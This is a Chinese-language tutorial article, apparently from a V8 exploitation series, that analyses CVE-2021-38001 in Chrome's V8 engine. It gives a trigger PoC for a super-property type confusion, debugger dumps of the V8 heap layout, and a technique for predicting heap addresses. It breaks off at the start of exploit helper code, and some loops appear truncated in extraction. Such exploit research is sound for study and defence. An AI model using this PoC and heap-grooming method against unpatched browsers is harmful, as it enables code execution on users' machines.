**作者：Hcamael@知道创宇404实验室**
**相关阅读：[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")  
[从 0 开始学 V8 漏洞利用之 starctf 2019 OOB（三）](https://paper.seebug.org/1822/ "从 0 开始学
V8 漏洞利用之 starctf 2019 OOB（三）")  
[从 0 开始学 V8 漏洞利用之 CVE-2020-6507（四）](https://paper.seebug.org/1823/ "从 0 开始学 V8
漏洞利用之 CVE-2020-6507（四）")  
[从0开始学 V8 漏洞利用之 CVE-2021-30632（五）](https://paper.seebug.org/1824/ "从0开始学 V8
漏洞利用之 CVE-2021-30632（五）")**
CVE-2021-38001漏洞分析
第四个研究的是`CVE-2021-38001`，其chrome的bug编号为：1260577
其相关信息还未公开，但是我们仍然能得知：
受影响的Chrome最高版本为：`95.0.4638.54` 受影响的V8最高版本为：`9.5.172.21`
# 搭建环境
一键编译相关环境：
    $ ./build.sh 9.5.172.21
该漏洞是2021年天府杯上提交的漏洞，在网上也只有一篇相关分析和PoC:
    import * as module from "1.mjs";
    function poc() {
        class C {
            m() {
                return super.y;
            }
        }
        let zz = {aa: 1, bb: 2};
        // receiver vs holder type confusion
        function trigger() {
            // set lookup_start_object
            C.prototype.__proto__ = zz;
            // set holder
            C.prototype.__proto__.__proto__ = module;
            // "c" is receiver in ComputeHandler [ic.cc]
            // "module" is holder
            // "zz" is lookup_start_object
            let c = new C();
            c.x0 = 0x42424242 / 2;
            c.x1 = 0x42424242 / 2;
            c.x2 = 0x42424242 / 2;
            c.x3 = 0x42424242 / 2;
            c.x4 = 0x42424242 / 2;
            // LoadWithReceiverIC_Miss
            // => UpdateCaches (Monomorphic)
            // CheckObjectType with "receiver"
            let res = c.m();
        }
        for (let i = 0; i  x/16gx 0x1f7a081c0000
    0x1f7a081c0000: 0x0000000000040000 0x0000000000000004
    0x1f7a081c0010: 0x000056021f06d738 0x00001f7a081c2118
    0x1f7a081c0020: 0x00001f7a08200000 0x000000000003dee8
    0x1f7a081c0030: 0x0000000000000000 0x0000000000002118
    0x1f7a081c0040: 0x000056021f0efae0 0x000056021f05f5a0
    0x1f7a081c0050: 0x00001f7a081c0000 0x0000000000040000
    0x1f7a081c0060: 0x000056021f0ed840 0x0000000000000000
    0x1f7a081c0070: 0xffffffffffffffff 0x0000000000000000
以下为该堆块的相关结构：
    0x1f7a081c0000: size = 0x40000
    0x1f7a081c0018: 堆的起始地址为0x00001f7a081c2118，在V8的堆结构中有0x2118字节用来存储堆结构相关信息
    0x1f7a081c0020: 堆指针，表示该堆已经被使用到哪了
    0x1f7a081c0028: 已经被使用的size, 0x3dee8 + 0x2118 = 0x40000
再来看看后面的堆布局：
    pwndbg> x/16gx 0x1f7a081c0000 + 0x40000
    0x1f7a08200000: 0x0000000000040000 0x0000000000000004
    0x1f7a08200010: 0x000056021f06d738 0x00001f7a08202118
    0x1f7a08200020: 0x00001f7a08240000 0x000000000003dee8
    0x1f7a08200030: 0x0000000000000000 0x0000000000002118
    0x1f7a08200040: 0x000056021f0f0140 0x000056021f05f5a0
    0x1f7a08200050: 0x00001f7a08200000 0x0000000000040000
    0x1f7a08200060: 0x000056021f0fd3c0 0x0000000000000000
    0x1f7a08200070: 0xffffffffffffffff 0x0000000000000000
结构同上，可以发现，在`0x1f7a081c0000 0x1f7a08240000 rw-p 80000 0
[anon_1f7a081c0]`内存区域中，由两个大小为`0x40000`的v8的堆组成。
如果这个时候，我申请一个`0xf700`大小的数组，在新版v8中，一个地址4字节，那么就是需要`0xf700 * 4 + 0x2118 =
0x3fd18`，再对齐一下，那么就是`0x40000`大小的堆，我们来测试一下：
    a = Array(0xf700);
    %DebugPrint(a);
    %SystemBreak();
得到变量`a`的信息为：
    DebugPrint: 0x2beb08049929: [JSArray]
     - map: 0x2beb08203ab9  [FastProperties]
     - prototype: 0x2beb081cc0e9 
     - elements: 0x2beb08242119  [HOLEY_SMI_ELEMENTS]
     - length: 63232
     - properties: 0x2beb0800222d 
     - All own properties (excluding elements): {
        0x2beb080048f1: [String] in ReadOnlySpace: #length: 0x2beb0814215d  (const accessor descriptor), location: descriptor
     }
     - elements: 0x2beb08242119  {
         0-63231: 0x2beb0800242d 
     }
发现堆布局的变化:
        0x2beb081c0000     0x2beb08280000 rw-p    c0000 0      [anon_2beb081c0]
size从`0x80000`变成了`0xc0000`，跟我预想的一样，增加了`0x40000`，而变量`a`的`elements`字段地址为`0x2beb081c0000
+ 0x80000 + 0x2118 + 0x1 = 0x2beb08242119`
在新版的V8种，因为启用的地址压缩特性，在堆中储存的地址为4字节，而根据上述堆的特性，我们能确定低2字节为`0x2119`
另外，堆地址总是从`0x00000000`开始的，在我的环境中，上述堆的高2字节总是`0x081c`，该数值取决于V8在前面的堆中储存了多少数据，该值不会随机变化，比如在写好的脚本中，该值基本不会发生改变。所以现在，可以确定一个有效地址：`0x081c0000
+ 0x2118 + 0x1 + 0x80000 + 0x40000 * n, n>=0`
如果在比较复杂的环境中，可以增加Array的数量，然后定一个比较大的值，如以下一个示例：
    big_array = [];
      for (let i = 0x0; i  {
        var f64 = new Float64Array(1);
        var bigUint64 = new BigUint64Array(f64.buffer);
        var u32 = new Uint32Array(f64.buffer);
        function d2u(v) {